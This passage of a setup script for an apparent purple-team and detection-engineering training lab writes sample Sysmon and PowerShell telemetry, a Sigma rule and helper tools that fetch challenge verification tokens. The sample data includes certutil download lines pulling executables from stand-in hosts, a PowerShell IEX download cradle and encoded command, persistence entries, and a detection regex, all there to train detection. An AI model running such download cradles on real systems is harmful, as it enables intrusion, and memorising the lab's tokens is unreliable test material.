        print("\n[+] Verification Token: CONTINUOUS_VALIDATION_DETECTION_VALIDATED")
else:
    print("Usage: continuous_validation_tool.py [--show-telemetry | --emulate-pipeline | --tune-guardrails | --challenge]")
EOF
chmod +x /home/operator/tools/continuous_validation_tool.py

# ============================================================================
# PURPLE TEAM ROOM 20: PURPLE TEAM CAPSTONE: FULL ADVERSARY EMULATION EXERCISE
# ============================================================================
mkdir -p /var/log/purple_capstone
cat << 'EOF' > /var/log/purple_capstone/apt29_exercise_events.json
[
  {
    "exercise_id": "EX-PURPLE-CAPSTONE-2026",
    "threat_actor": "APT29 / Cozy Bear",
    "phase_1_initial_access": {
      "technique": "T1566.001 - Spearphishing Attachment",
      "status": "EMULATED",
      "detected": true,
      "rule": "EDR-PHISH-MALICIOUS-ISO"
    },
    "phase_2_privilege_escalation": {
      "technique": "T1548.002 - Bypass UAC",
      "status": "EMULATED",
      "detected": true,
      "rule": "SIGMA-UAC-FODHELPER"
    },
    "phase_3_lateral_movement": {
      "technique": "T1021.006 - WinRM Remote Execution",
      "status": "EMULATED",
      "detected": true,
      "rule": "WINRM-UNUSUAL-SOURCE-IP"
    },
    "phase_4_data_collection": {
      "technique": "T1560.001 - Archive via Utility",
      "status": "EMULATED",
      "detected": true,
      "rule": "RAR-ARCHIVE-EXFIL-STAGING"
    }
  }
]
EOF
chmod 644 /var/log/purple_capstone/apt29_exercise_events.json

cat << 'EOF' > /home/operator/tools/purple_capstone_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8320
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/purple_capstone/apt29_exercise_events.json") as f:
        print(f.read())
elif "--emulate-campaign" in args or "--emulate" in args:
    payload = {
        "threat_actor": "APT29",
        "phases": ["Initial Access", "Privilege Escalation", "Lateral Movement", "Data Collection"]
    }
    res = http_post("/api/purple-capstone/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "PURPLE_CAPSTONE_EMULATION_VERIFIED":
        print("\n[+] Verification Token: PURPLE_CAPSTONE_EMULATION_VERIFIED")
elif "--tune-enterprise-rules" in args:
    payload = {
        "policy_bundle": "ENTERPRISE-ADVERSARY-DEFENSE",
        "status": "ACTIVE_ENFORCEMENT"
    }
    res = http_post("/api/purple-capstone/tune-enterprise-rules", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_PURPLE_CAPSTONE"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "PURPLE_CAPSTONE_DETECTION_VALIDATED":
        print("\n[+] Verification Token: PURPLE_CAPSTONE_DETECTION_VALIDATED")
else:
    print("Usage: purple_capstone_tool.py [--show-telemetry | --emulate-campaign | --tune-enterprise-rules | --challenge]")
EOF
chmod +x /home/operator/tools/purple_capstone_tool.py

# ============================================================================
# DETECTION ENGINEERING ROOM 01: FOUNDATIONS & DETECTION-AS-CODE
# ============================================================================
mkdir -p /var/log/detection /home/operator/tools

cat << 'EOF' > /var/log/detection/ddlc_pipeline_events.json
[
  {
    "stage": "LINTING",
    "tool": "sigma-lint",
    "status": "PASSED",
    "rules_evaluated": 42,
    "syntax_errors": 0
  },
  {
    "stage": "UNIT_TEST",
    "tool": "pytest-detections",
    "status": "PASSED",
    "unit_tests_run": 84,
    "failures": 0
  },
  {
    "stage": "SNR_VALIDATION",
    "tool": "snr-profiler",
    "status": "FLAGGED_HIGH_NOISE",
    "rule_id": "RULE-DAC-104",
    "rule_name": "PowerShell Script Execution - High Frequency Backup",
    "alert_count_24h": 1420,
    "true_positive_rate": 0.05,
    "recommendation": "TUNE_OUTLIER_NOISE"
  },
  {
    "stage": "CANARY_DEPLOYMENT",
    "tool": "cicd-canary-gate",
    "status": "PENDING_TUNING",
    "target_cluster": "staging-siem-01"
  }
]
EOF
chmod 644 /var/log/detection/ddlc_pipeline_events.json

cat << 'EOF' > /home/operator/tools/detection_foundations_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8401
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/detection/ddlc_pipeline_events.json") as f:
        print(f.read())
elif "--emulate-pipeline" in args or "--emulate" in args:
    payload = {
        "pipeline_action": "VALIDATE_DDLC_PIPELINE",
        "stages": ["LINT", "UNIT_TEST", "SNR_VALIDATION", "CANARY_DEPLOY"]
    }
    res = http_post("/api/detection-foundations/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "DETECTION_FOUNDATIONS_VERIFIED":
        print("\n[+] Verification Token: DETECTION_FOUNDATIONS_VERIFIED")
elif "--tune-snr" in args:
    payload = {
        "rule_id": "RULE-DAC-104",
        "action": "EXCLUDE_BENIGN_BACKUP_NOISE"
    }
    res = http_post("/api/detection-foundations/tune-snr", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_DETECTION_FOUNDATIONS"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "DETECTION_FOUNDATIONS_VALIDATED":
        print("\n[+] Verification Token: DETECTION_FOUNDATIONS_VALIDATED")
else:
    print("Usage: detection_foundations_tool.py [--show-telemetry | --emulate-pipeline | --tune-snr | --challenge]")
EOF
chmod +x /home/operator/tools/detection_foundations_tool.py

# ============================================================================
# DETECTION ENGINEERING ROOM 02: LOG NORMALIZATION & TAXONOMY (ECS & CIM)
# ============================================================================
cat << 'EOF' > /var/log/detection/raw_event_schema.json
[
  {
    "source": "windows_security_4688",
    "raw_fields": {
      "EventID": 4688,
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "SubjectUserName": "SYSTEM",
      "CommandLine": "cmd.exe /c whoami",
      "ProcessId": "0x1a4"
    },
    "normalized_mapping": {
      "ecs": {
        "process.executable": "C:\\Windows\\System32\\cmd.exe",
        "user.name": "SYSTEM",
        "process.command_line": "cmd.exe /c whoami",
        "process.pid": 420
      },
      "cim": {
        "process": "cmd.exe",
        "user": "SYSTEM",
        "cmdline": "cmd.exe /c whoami",
        "process_id": 420
      }
    }
  },
  {
    "source": "linux_auditd_syscall",
    "raw_fields": {
      "type": "SYSCALL",
      "arch": "c000003e",
      "syscall": 59,
      "comm": "id",
      "exe": "/usr/bin/id",
      "uid": 1000
    },
    "normalized_mapping": {
      "ecs": {
        "process.executable": "/usr/bin/id",
        "process.name": "id",
        "user.id": "1000"
      },
      "cim": {
        "process": "id",
        "process_path": "/usr/bin/id",
        "user_id": 1000
      }
    }
  }
]
EOF
chmod 644 /var/log/detection/raw_event_schema.json

cat << 'EOF' > /home/operator/tools/log_normalization_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8402
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/detection/raw_event_schema.json") as f:
        print(f.read())
elif "--emulate-normalization" in args or "--emulate" in args:
    payload = {
        "schema_action": "NORMALIZE_RAW_TELEMETRY",
        "target_models": ["ECS", "CIM"]
    }
    res = http_post("/api/detection-normalization/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "LOG_NORMALIZATION_VERIFIED":
        print("\n[+] Verification Token: LOG_NORMALIZATION_VERIFIED")
elif "--tune-taxonomy" in args:
    payload = {
        "schema_target": "ECS_PROCESS_TAXONOMY",
        "field_mapping": {
          "NewProcessName": "process.executable",
          "CommandLine": "process.command_line"
        }
    }
    res = http_post("/api/detection-normalization/tune-taxonomy", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_LOG_NORMALIZATION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "LOG_NORMALIZATION_VALIDATED":
        print("\n[+] Verification Token: LOG_NORMALIZATION_VALIDATED")
else:
    print("Usage: log_normalization_tool.py [--show-telemetry | --emulate-normalization | --tune-taxonomy | --challenge]")
EOF
chmod +x /home/operator/tools/log_normalization_tool.py

# ============================================================================
# DETECTION ENGINEERING ROOM 03: SIGMA RULE SYNTAX & COMPONENT STRUCTURE
# ============================================================================
cat << 'EOF' > /var/log/detection/sample_sigma_rule.yaml
title: Certutil Download Cradle Execution
id: c0a80001-2026-sig-0003-certutil
status: experimental
description: Detects suspicious certutil.exe execution used to download remote payloads
references:
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.t1105
  - attack.command_and_control
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\certutil.exe'
  selection_flags:
    CommandLine|contains:
      - '-urlcache'
      - '-split'
  condition: selection_img and selection_flags
fields:
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - Legitimate PKI certificate verification scripts
level: high
EOF
chmod 644 /var/log/detection/sample_sigma_rule.yaml

cat << 'EOF' > /var/log/detection/sigma_eval_dataset.json
[
  {
    "EventID": 1,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/beacon.exe beacon.exe",
    "User": "CORP\\Administrator",
    "expected_match": true
  },
  {
    "EventID": 1,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -verify -urlcache cert.pem",
    "User": "CORP\\SecOps",
    "expected_match": false
  }
]
EOF
chmod 644 /var/log/detection/sigma_eval_dataset.json

cat << 'EOF' > /home/operator/tools/sigma_syntax_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8403
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/detection/sample_sigma_rule.yaml") as f:
        print(f.read())
elif "--emulate-parser" in args or "--emulate" in args:
    payload = {
        "rule_id": "SIGMA-SYNTAX-103",
        "action": "EVALUATE_SIGMA_STRUCTURE"
    }
    res = http_post("/api/detection-sigma-syntax/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "SIGMA_SYNTAX_VERIFIED":
        print("\n[+] Verification Token: SIGMA_SYNTAX_VERIFIED")
elif "--tune-condition" in args:
    payload = {
        "rule_id": "SIGMA-SYNTAX-103",
        "condition_expression": "selection_img and selection_flags"
    }
    res = http_post("/api/detection-sigma-syntax/tune-condition", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_SIGMA_SYNTAX"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "SIGMA_SYNTAX_VALIDATED":
        print("\n[+] Verification Token: SIGMA_SYNTAX_VALIDATED")
else:
    print("Usage: sigma_syntax_tool.py [--show-telemetry | --emulate-parser | --tune-condition | --challenge]")
EOF
chmod +x /home/operator/tools/sigma_syntax_tool.py

# ============================================================================
# DETECTION ENGINEERING ROOM 04: WRITING PROCESS CREATION RULES (SYSMON 1)
# ============================================================================
cat << 'EOF' > /var/log/detection/sysmon_event_1_dataset.json
[
  {
    "EventID": 1,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "RuleName": "technique_id=T1105,technique_name=Ingress Tool Transfer",
    "UtcTime": "2026-11-15 16:30:10.104",
    "ProcessGuid": "{d3b07384-0001-0000-0010-440000000000}",
    "ProcessId": "3412",
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -urlcache -split -f http://evil-infra.internal/rat.exe C:\\Temp\\rat.exe",
    "CurrentDirectory": "C:\\Users\\victim\\",
    "User": "CORP\\victim",
    "ParentProcessGuid": "{d3b07384-0000-0000-0010-430000000000}",
    "ParentProcessId": "1940",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "Hashes": "SHA256=A1B2C3D4E5F67890123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0"
  },
  {
    "EventID": 1,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "UtcTime": "2026-11-15 16:31:00.220",
    "ProcessId": "5120",
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -verifyctl C:\\Certs\\test.ctl",
    "User": "CORP\\Administrator",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "benign": true
  }
]
EOF
chmod 644 /var/log/detection/sysmon_event_1_dataset.json

cat << 'EOF' > /home/operator/tools/process_creation_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8404
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/detection/sysmon_event_1_dataset.json") as f:
        print(f.read())
elif "--emulate-detection" in args or "--emulate" in args:
    payload = {
        "event_id": 1,
        "image": "certutil.exe",
        "action": "EVALUATE_PROCESS_CREATION_RULE"
    }
    res = http_post("/api/detection-process-creation/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "PROCESS_CREATION_VERIFIED":
        print("\n[+] Verification Token: PROCESS_CREATION_VERIFIED")
elif "--tune-lolbin-filter" in args:
    payload = {
        "filter_name": "EXCLUDE_BENIGN_VERIFYCTL",
        "image": "certutil.exe",
        "benign_flag": "-verifyctl"
    }
    res = http_post("/api/detection-process-creation/tune-lolbin-filter", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_PROCESS_CREATION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "PROCESS_CREATION_VALIDATED":
        print("\n[+] Verification Token: PROCESS_CREATION_VALIDATED")
else:
    print("Usage: process_creation_tool.py [--show-telemetry | --emulate-detection | --tune-lolbin-filter | --challenge]")
EOF
chmod +x /home/operator/tools/process_creation_tool.py

# ============================================================================
# DETECTION ENGINEERING ROOM 05: WRITING NETWORK CONNECTION RULES (SYSMON 3)
# ============================================================================
cat << 'EOF' > /var/log/detection/sysmon_event_3_dataset.json
[
  {
    "EventID": 3,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "RuleName": "technique_id=T1571,technique_name=Non-Standard Port",
    "UtcTime": "2026-11-15 17:10:05.312",
    "ProcessId": "4892",
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "User": "CORP\\analyst",
    "Protocol": "tcp",
    "Initiated": "true",
    "SourceIp": "10.10.14.90",
    "SourcePort": 49210,
    "DestinationIp": "198.51.100.44",
    "DestinationPort": 8443,
    "label": "ATTACK_POSITIVE"
  },
  {
    "EventID": 3,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "UtcTime": "2026-11-15 17:11:15.550",
    "ProcessId": "2310",
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "User": "CORP\\analyst",
    "Protocol": "tcp",
    "Initiated": "true",
    "SourceIp": "10.10.14.90",
    "SourcePort": 51102,
    "DestinationIp": "142.250.190.46",
    "DestinationPort": 443,
    "label": "BENIGN_BROWSER_TRAFFIC"
  }
]
EOF
chmod 644 /var/log/detection/sysmon_event_3_dataset.json

cat << 'EOF' > /home/operator/tools/network_connection_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8405
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/detection/sysmon_event_3_dataset.json") as f:
        print(f.read())
elif "--emulate-detection" in args or "--emulate" in args:
    payload = {
        "event_id": 3,
        "image": "rundll32.exe",
        "destination_port": 8443,
        "action": "EVALUATE_NETWORK_RULE"
    }
    res = http_post("/api/detection-network-rules/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "NETWORK_DETECTION_VERIFIED":
        print("\n[+] Verification Token: NETWORK_DETECTION_VERIFIED")
elif "--tune-filter" in args:
    payload = {
        "filter_name": "EXCLUDE_STANDARD_BROWSER_HTTPS",
        "destination_port": 443
    }
    res = http_post("/api/detection-network-rules/tune-filter", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_NETWORK_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "NETWORK_DETECTION_VALIDATED":
        print("\n[+] Verification Token: NETWORK_DETECTION_VALIDATED")
else:
    print("Usage: network_connection_tool.py [--show-telemetry | --emulate-detection | --tune-filter | --challenge]")
EOF
chmod +x /home/operator/tools/network_connection_tool.py

# ============================================================================
# DETECTION ENGINEERING ROOM 06: WRITING FILE & REGISTRY INTEGRITY RULES
# ============================================================================
cat << 'EOF' > /var/log/detection/file_registry_dataset.json
[
  {
    "EventID": 13,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "RuleName": "technique_id=T1547.001,technique_name=Registry Run Keys",
    "UtcTime": "2026-11-15 17:20:11.801",
    "ProcessId": "3820",
    "Image": "C:\\Windows\\System32\\reg.exe",
    "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
    "Details": "C:\\Users\\Public\\updater.exe",
    "label": "ATTACK_PERSISTENCE_RUNKEY"
  },
  {
    "EventID": 11,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "UtcTime": "2026-11-15 17:21:04.119",
    "ProcessId": "5040",
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "TargetFilename": "C:\\Users\\Operator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat",
    "label": "ATTACK_STARTUP_FOLDER"
  },
  {
    "EventID": 13,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "UtcTime": "2026-11-15 17:22:30.400",
    "ProcessId": "890",
    "Image": "C:\\Windows\\System32\\sppsvc.exe",
    "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform\\KeepRunningVersion",
    "Details": "10.0.19041",
    "label": "BENIGN_SYSTEM_UPDATE"
  }
]
EOF
chmod 644 /var/log/detection/file_registry_dataset.json

cat << 'EOF' > /home/operator/tools/file_registry_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8406
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/detection/file_registry_dataset.json") as f:
        print(f.read())
elif "--emulate-detection" in args or "--emulate" in args:
    payload = {
        "event_ids": [11, 13],
        "action": "EVALUATE_FILE_REGISTRY_RULE"
    }
    res = http_post("/api/detection-file-registry/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "FILE_REGISTRY_VERIFIED":
        print("\n[+] Verification Token: FILE_REGISTRY_VERIFIED")
elif "--tune-filter" in args:
    payload = {
        "filter_name": "EXCLUDE_BENIGN_SPPSVC",
        "image": "sppsvc.exe"
    }
    res = http_post("/api/detection-file-registry/tune-filter", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_FILE_REGISTRY"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "FILE_REGISTRY_VALIDATED":
        print("\n[+] Verification Token: FILE_REGISTRY_VALIDATED")
else:
    print("Usage: file_registry_tool.py [--show-telemetry | --emulate-detection | --tune-filter | --challenge]")
EOF
chmod +x /home/operator/tools/file_registry_tool.py

# ============================================================================
# DETECTION ENGINEERING ROOM 07: DETECTING AUTHENTICATION ABUSE
# ============================================================================
cat << 'EOF' > /var/log/detection/auth_abuse_dataset.json
[
  {
    "EventID": 4625,
    "Channel": "Security",
    "RuleName": "technique_id=T1110.003,technique_name=Password Spraying",
    "UtcTime": "2026-11-15 17:30:00.120",
    "TargetUserName": "admin",
    "Status": "0xC000006D",
    "SubStatus": "0xC000006A",
    "IpAddress": "198.51.100.77",
    "LogonType": 3,
    "label": "ATTACK_PASSWORD_SPRAY"
  },
  {
    "EventID": 4672,
    "Channel": "Security",
    "RuleName": "technique_id=T1078,technique_name=Valid Accounts",
    "UtcTime": "2026-11-15 17:30:45.340",
    "SubjectUserName": "admin",
    "PrivilegeList": ["SeDebugPrivilege", "SeTcbPrivilege"],
    "label": "ATTACK_SPECIAL_PRIVILEGE_ASSIGNMENT"
  },
  {
    "EventID": 4624,
    "Channel": "Security",
    "UtcTime": "2026-11-15 17:31:10.500",
    "TargetUserName": "svc-backup",
    "LogonType": 5,
    "IpAddress": "127.0.0.1",
    "label": "BENIGN_SERVICE_LOGON"
  }
]
EOF
chmod 644 /var/log/detection/auth_abuse_dataset.json

cat << 'EOF' > /home/operator/tools/auth_abuse_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8407
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/detection/auth_abuse_dataset.json") as f:
        print(f.read())
elif "--emulate-detection" in args or "--emulate" in args:
    payload = {
        "event_ids": [4624, 4625, 4672],
        "action": "EVALUATE_AUTH_ABUSE_RULE"
    }
    res = http_post("/api/detection-auth-abuse/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "AUTH_ABUSE_VERIFIED":
        print("\n[+] Verification Token: AUTH_ABUSE_VERIFIED")
elif "--tune-baseline" in args:
    payload = {
        "action": "EXCLUDE_LOGON_TYPE_5",
        "logon_type": 5
    }
    res = http_post("/api/detection-auth-abuse/tune-baseline", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_AUTH_ABUSE"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "AUTH_ABUSE_VALIDATED":
        print("\n[+] Verification Token: AUTH_ABUSE_VALIDATED")
else:
    print("Usage: auth_abuse_tool.py [--show-telemetry | --emulate-detection | --tune-baseline | --challenge]")
EOF
chmod +x /home/operator/tools/auth_abuse_tool.py

# ============================================================================
# DETECTION ENGINEERING ROOM 08: DETECTING POWERSHELL OBFUSCATION
# ============================================================================
cat << 'EOF' > /var/log/detection/powershell_obfuscation_dataset.json
[
  {
    "EventID": 4104,
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "RuleName": "technique_id=T1059.001,technique_name=PowerShell",
    "UtcTime": "2026-11-15 17:40:02.001",
    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.99/payload.ps1')",
    "Path": "",
    "label": "ATTACK_DOWNLOAD_CRADLE"
  },
  {
    "EventID": 4104,
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "UtcTime": "2026-11-15 17:40:35.412",
    "ScriptBlockText": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",
    "Path": "",
    "label": "ATTACK_BASE64_ENCODED"
  },
  {
    "EventID": 4104,
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "UtcTime": "2026-11-15 17:41:10.900",
    "ScriptBlockText": "Import-Module ActiveDirectory; Get-ADUser -Filter *",
    "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ActiveDirectory",
    "label": "BENIGN_ADMINISTRATIVE_POWERSHELL"
  }
]
EOF
chmod 644 /var/log/detection/powershell_obfuscation_dataset.json

cat << 'EOF' > /home/operator/tools/powershell_obfuscation_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8408
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/detection/powershell_obfuscation_dataset.json") as f:
        print(f.read())
elif "--emulate-detection" in args or "--emulate" in args:
    payload = {
        "event_id": 4104,
        "action": "EVALUATE_POWERSHELL_OBFUSCATION_RULE"
    }
    res = http_post("/api/detection-powershell/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "POWERSHELL_DETECTION_VERIFIED":
        print("\n[+] Verification Token: POWERSHELL_DETECTION_VERIFIED")
elif "--tune-regex" in args:
    payload = {
        "regex_pattern": "(?i)(iex|downloadstring|webclient|-enc|-encodedcommand)"
    }
    res = http_post("/api/detection-powershell/tune-regex", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_POWERSHELL_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
